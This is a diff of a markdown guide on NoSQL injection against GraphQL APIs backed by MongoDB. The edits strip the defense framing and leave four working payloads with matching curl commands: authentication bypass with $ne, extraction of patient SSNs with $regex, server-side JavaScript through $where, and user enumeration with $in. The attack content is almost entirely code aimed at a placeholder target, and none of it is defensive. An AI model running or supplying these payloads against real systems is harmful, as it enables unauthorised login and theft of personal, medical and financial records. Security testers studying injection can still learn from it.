@@ -1,7 +1,7 @@
 ---
 title: Mastering NoSQL Injection in GraphQL and MongoDB
 description: Explore NoSQL injection techniques to manipulate GraphQL API queries
-  backed by MongoDB. Learn attack methods and defenses.
+  backed by MongoDB, focusing on practical attack methods.
 keywords:
 - NoSQL injection
 - GraphQL
@@ -46,77 +46,99 @@ graph TD;
 
 ### Authentication Bypass via $ne Operator Injection
 
-- **Payload:** Inject the following into form fields to bypass authentication checks by subverting expected equality logic with `$ne`.
+- **Payload:** Use the following JSON body to inject `$ne` into authentication checks:
   ```json
   {
-      "username": {"$ne": null},
-      "password": {"$ne": null}
+    "query": "query Login($creds: LoginInput!) { login(input: $creds) { token } }",
+    "variables": {
+      "creds": {
+        "username": { "$ne": null },
+        "password": { "$ne": null }
+      }
+    }
   }
   ```
 
 - **Command Line:**
   ```bash
-  curl -X POST http://target/graphql -H 'Content-Type: application/json' \
-  --data '{"query": "query { login(username: \"{\"\$ne\":null}\", password: \"{\"\$ne\":null}\") { token } }"}'
+  curl -X POST http://target/graphql \
+    -H 'Content-Type: application/json' \
+    --data '{"query":"query Login($creds: LoginInput!){ login(input:$creds){ token } }","variables":{"creds":{"username":{"$ne":null},"password":{"$ne":null}}}}'
   ```
 
-- **Outcome:** This action will enable access without valid credentials by making the check always true, thereby bypassing authentication logic.
+- **Outcome:** Access is granted without valid credentials by forcing the authentication condition to evaluate as true.
 
 ### Sensitive Data Extraction via $regex Injection
 
-- **Payload:** Use this payload to extract data like SSNs by matching all possible entries with a $regex pattern.
+- **Payload:** Use this JSON body to inject a `$regex` filter that matches all SSNs:
   ```json
   {
-      "ssn": {"$regex": ".*"}
+    "query": "query Patients($filter: PatientFilter!) { patients(filter: $filter) { name ssn } }",
+    "variables": {
+      "filter": {
+        "ssn": { "$regex": ".*" }
+      }
+    }
   }
   ```
 
 - **Command Line:**
   ```bash
-  curl -X POST http://target/graphql -H 'Content-Type: application/json' \
-  --data '{"query": "query { patients(filter: { ssn: \"{\\\"$regex\\\":\\\".*\\\"}\" }) { name ssn } }"}'
+  curl -X POST http://target/graphql \
+    -H 'Content-Type: application/json' \
+    --data '{"query":"query Patients($filter:PatientFilter!){ patients(filter:$filter){ name ssn } }","variables":{"filter":{"ssn":{"$regex":".*"}}}}'
   ```
 
-- **Outcome:** Gain access to extract sensitive patient SSNs, matching any entry and circumventing intended filters.
+- **Outcome:** All patient SSNs matching the regular expression are returned, exposing sensitive records.
 
 ### Arbitrary Query Manipulation via $where Injection
 
-- **Payload:** Filter records by injecting JavaScript logic with the $where operator to selectively extract information based on conditions like balance.
+- **Payload:** Inject a `$where` clause to execute JavaScript logic server-side:
   ```json
   {
-      "$where": "this.balance > 10000"
+    "query": "query Accounts($filter: AccountFilter!) { accounts(filter: $filter) { owner balance } }",
+    "variables": {
+      "filter": {
+        "$where": "this.balance > 10000"
+      }
+    }
   }
   ```
 
 - **Command Line:**
   ```bash
-  curl -X POST http://target/graphql -H 'Content-Type: application/json' \
-  --data '{"query": "query { accounts(filter: \"{\\\"$where\\\":\\\"this.balance > 10000\\\"}\") { owner balance } }"}'
+  curl -X POST http://target/graphql \
+    -H 'Content-Type: application/json' \
+    --data '{"query":"query Accounts($filter:AccountFilter!){ accounts(filter:$filter){ owner balance } }","variables":{"filter":{"$where":"this.balance > 10000"}}}'
   ```
 
-- **Outcome:** Access restricted financial data by executing JavaScript logic within MongoDB, targeting records with high balances.
+- **Outcome:** Only accounts with balances greater than 10,000 are returned, revealing high-value targets.
 
 ### Bulk Data Access via $in Operator Injection
 
-- **Payload:** Use the $in operator to match multiple usernames, fetching bulk data.
+- **Payload:** Use the `$in` operator to expand username matching:
   ```json
   {
-      "username": {"$in": [""]}
+    "query": "query Users($filter: UserFilter!) { users(filter: $filter) { username email } }",
+    "variables": {
+      "filter": {
+        "username": { "$in": ["admin", "user", "test"] }
+      }
+    }
   }
   ```
 
 - **Command Line:**
   ```bash
-  curl -X POST http://target/graphql -H 'Content-Type: application/json' \
-  --data '{"query": "query { users(filter: { username: \"{\\\"$in\\\":[\\\"\\\"]}\" }) { username email } }"}'
+  curl -X POST http://target/graphql \
+    -H 'Content-Type: application/json' \
+    --data '{"query":"query Users($filter:UserFilter!){ users(filter:$filter){ username email } }","variables":{"filter":{"username":{"$in":["admin","user","test"]}}}}'
   ```
 
-- **Outcome:** Enumerate all user accounts by exploiting the username filter, accessing extensive sensitive data lists.
+- **Outcome:** Multiple user records are returned in a single request, enabling efficient bulk enumeration.
 
 ## Tools
 
 - **curl**
 - **Burp Suite**
 - **Postman** 
-
-Each of these tools facilitates interaction and testing against web services, enabling the crafting and dispatch of GraphQL queries to exploit NoSQL injection vulnerabilities effectively.
